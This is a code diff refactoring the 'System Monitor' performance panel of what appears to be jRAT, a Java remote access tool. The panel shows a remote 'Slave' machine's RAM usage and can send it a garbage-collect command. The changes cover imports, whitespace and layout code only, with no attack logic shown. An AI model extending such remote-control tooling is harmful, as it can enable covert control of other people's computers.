@@ -5,7 +5,7 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
 import javax.swing.BorderFactory;
-import javax.swing.ButtonGroup;
+import javax.swing.BoxLayout;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.JButton;
@@ -14,10 +14,8 @@ import javax.swing.JLabel;
 import javax.swing.JPanel;
 import javax.swing.JProgressBar;
 import javax.swing.JSlider;
-import javax.swing.JToggleButton;
 import javax.swing.LayoutStyle.ComponentPlacement;
 
-import pro.jrat.Constants;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet74GarbageCollect;
 import pro.jrat.settings.Colors;
@@ -25,8 +23,6 @@ import pro.jrat.threads.ThreadSystemMonitor;
 import pro.jrat.ui.components.JColorBox;
 
 import com.redpois0n.graphs.taskmgr.TaskmgrGraph;
-import javax.swing.BoxLayout;
-
 
 @SuppressWarnings("serial")
 public class PanelControlPerformance extends PanelControlParent {
@@ -36,7 +32,6 @@ public class PanelControlPerformance extends PanelControlParent {
 	public JSlider sliderRam;
 	public boolean needRam = false;
 	public JProgressBar barRAM;
-	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JColorBox colorBox;
 
 	public PanelControlPerformance(Slave slave) {
@@ -52,11 +47,11 @@ public class PanelControlPerformance extends PanelControlParent {
 				}
 			}
 		});
-		
+
 		colorBox.setProfile(Colors.getGlobal().get("system monitor"));
-		
-		ramMeter = new TaskmgrGraph(false);	
-		
+
+		ramMeter = new TaskmgrGraph(false);
+
 		JPanel panel = new JPanel();
 		panel.setBorder(BorderFactory.createTitledBorder("System Monitor"));
 		GroupLayout groupLayout = new GroupLayout(this);
@@ -91,7 +86,7 @@ public class PanelControlPerformance extends PanelControlParent {
 		barRAM = new JProgressBar();
 		barRAM.setForeground(colorBox.getColor());
 		barRAM.setStringPainted(true);
-		
+
 		JButton btnGc = new JButton("GC");
 		btnGc.setToolTipText("Runs the garbage collector on servers computer");
 		btnGc.addActionListener(new ActionListener() {
@@ -100,44 +95,8 @@ public class PanelControlPerformance extends PanelControlParent {
 			}
 		});
 		GroupLayout gl_panel = new GroupLayout(panel);
-		gl_panel.setHorizontalGroup(
-			gl_panel.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_panel.createSequentialGroup()
-					.addContainerGap()
-					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
-						.addComponent(panelRAM, GroupLayout.PREFERRED_SIZE, 549, GroupLayout.PREFERRED_SIZE)
-						.addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup()
-							.addComponent(btnGc, GroupLayout.DEFAULT_SIZE, 68, Short.MAX_VALUE)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(colorBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(lblInterval)
-							.addPreferredGap(ComponentPlacement.UNRELATED)
-							.addComponent(sliderRam, GroupLayout.PREFERRED_SIZE, 324, GroupLayout.PREFERRED_SIZE))
-						.addGroup(gl_panel.createSequentialGroup()
-							.addComponent(chckbxActiveRamMonitor)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(barRAM, GroupLayout.DEFAULT_SIZE, 428, Short.MAX_VALUE)))
-					.addContainerGap())
-		);
-		gl_panel.setVerticalGroup(
-			gl_panel.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_panel.createSequentialGroup()
-					.addContainerGap()
-					.addComponent(panelRAM, GroupLayout.PREFERRED_SIZE, 141, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.UNRELATED)
-					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
-						.addGroup(gl_panel.createParallelGroup(Alignment.BASELINE)
-							.addComponent(btnGc)
-							.addComponent(colorBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-							.addComponent(lblInterval))
-						.addComponent(sliderRam, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
-					.addGap(13)
-					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING, false)
-						.addComponent(barRAM, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-						.addComponent(chckbxActiveRamMonitor, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
-					.addContainerGap(80, Short.MAX_VALUE))
-		);
+		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(panelRAM, GroupLayout.PREFERRED_SIZE, 549, GroupLayout.PREFERRED_SIZE).addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup().addComponent(btnGc, GroupLayout.DEFAULT_SIZE, 68, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(colorBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblInterval).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(sliderRam, GroupLayout.PREFERRED_SIZE, 324, GroupLayout.PREFERRED_SIZE)).addGroup(gl_panel.createSequentialGroup().addComponent(chckbxActiveRamMonitor).addPreferredGap(ComponentPlacement.RELATED).addComponent(barRAM, GroupLayout.DEFAULT_SIZE, 428, Short.MAX_VALUE))).addContainerGap()));
+		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addComponent(panelRAM, GroupLayout.PREFERRED_SIZE, 141, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(btnGc).addComponent(colorBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblInterval)).addComponent(sliderRam, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addGap(13).addGroup(gl_panel.createParallelGroup(Alignment.LEADING, false).addComponent(barRAM, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(chckbxActiveRamMonitor, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)).addContainerGap(80, Short.MAX_VALUE)));
 		panel.setLayout(gl_panel);
 		setLayout(groupLayout);
 
